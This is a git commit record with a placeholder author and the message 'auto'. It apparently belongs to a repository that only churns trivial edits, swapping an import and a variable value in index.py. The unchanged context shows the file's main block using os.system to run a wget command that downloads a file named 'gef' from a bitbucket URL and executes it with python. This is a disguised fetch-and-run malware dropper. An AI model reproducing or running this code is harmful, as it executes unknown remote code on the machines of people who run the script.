0ef2bf48c5328a680d0a22bb297636ffc049d594
Your Name <you@example.com>
2024-10-12 00:34:57 +0200

    auto

--- index.py
+++ index.py
@@ -1,4 +1,4 @@
-import sys,os,decimal
-r=10
+import sys,os,itertools
+j=16
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
